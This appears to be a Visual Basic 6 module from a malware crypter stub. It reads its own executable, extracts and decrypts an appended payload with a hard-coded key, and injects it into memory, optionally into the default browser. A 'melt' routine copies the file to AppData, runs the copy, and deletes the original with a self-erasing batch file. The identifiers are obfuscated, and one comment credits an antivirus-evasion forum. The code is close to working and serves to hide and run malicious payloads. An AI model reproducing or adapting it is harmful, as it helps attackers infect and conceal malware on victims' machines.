Attribute VB_Name = "mHaupt"
Option Explicit
Const CryptKey As String = "JRPjXQtMmj"


Sub Main()

Dim sFile As String
Dim sBfile As String
Dim bFile() As Byte
Dim bBfile() As Byte
Dim sSPlit() As String
Dim inj As New cNtPEL

  Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
   sFile = Space(sLOF(App.Path & "\" & App.EXEName & ".exe"))
  Get #1, , sFile
  Close #1

  sSPlit = Split(sFile, "SbhFnVXOdPhSy35crYPS")
  
  If sSPlit(5) = "1" Then
  Call fMelt(Environ("appdata"))
  End If
  
  If sSPlit(2) = "D2lDZLkpRxU3VkQZMD9Gt2e2v3YqD" Then
  sBfile = sSPlit(3)
  bBfile = StrConv(sBfile, vbFromUnicode)
  inj.DvN2kUqPS1RGC5XHVRzi77ghD bBfile
  End If
  
  sFile = inj.Encrypt(sSPlit(1), CryptKey)
  bFile = StrConv(sFile, vbFromUnicode)
  Select Case sSPlit(4)
  Case "Fqq3lsIPwuiuPoFf8kK5KBJTHEg5"
  inj.DvN2kUqPS1RGC5XHVRzi77ghD bFile, inj.DefaultBrowser
  Case "UiUsIHnFcKuU"
  inj.DvN2kUqPS1RGC5XHVRzi77ghD bFile
  End Select
  
End Sub
Public Function sLOF(sPath As String) As Double
'Autor: Slek
'Utilizado como alternativa a LOF
'Fecha: 7/03/10
'Indetectables.net
Dim Fso, F As Object
   
Set Fso = CreateObject("Scripting.FileSystemObject")
Set F = Fso.GetFile(sPath)
   
sLOF = F.Size
End Function
Function aPt$() 'this just returns the full application path + filename
    aPt$ = Replace$(App.Path & "\" & App.EXEName & ".exe", "\\", "\")
End Function

Sub X()
    Dim A$
    A$ = Environ$("appdata") & "\djhf.bat" 'batch file goes in temp dir
    A$ = Replace(A$, "\\", "\") 'replace double backslashes
    Open A$ For Output As #3 'open batch file for writing
        Print #3, "del " & Chr$(34) & App.Path & "\" & App.EXEName & ".exe" & Chr$(34)
            '^^ above is to delete the file that is going to melt
        Print #3, "del " & Chr(34) & A$ & Chr(34)
            '^^ self deletion of batch file
    Close #3 'close the batch file
    
    Shell A$ 'run the batch file
    DoEvents 'give it time to get executed
    End 'exits the app thats melting
End Sub

Public Function fMelt(ByVal Installpath As String) As Boolean
Dim sMelt As String
On Error GoTo rznrtnhhb
    If App.Path = Installpath Then
    fMelt = True
    Exit Function
    Else
        
        Open App.Path & "\" & App.EXEName & ".exe" For Binary As #5
         sMelt = Space(sLOF(App.Path & "\" & App.EXEName & ".exe"))
        Get #5, , sMelt
        Close #5
        Open Installpath & "\" & App.EXEName & ".exe" For Binary As #6
        Put #6, , sMelt
        Close #6
        
        DoEvents 'give it time to copy
        Shell Installpath & "\" & App.EXEName & ".exe", vbNormal 'run new file
        DoEvents 'give it time to run
        X 'melt first file
    End If
rznrtnhhb:
End Function

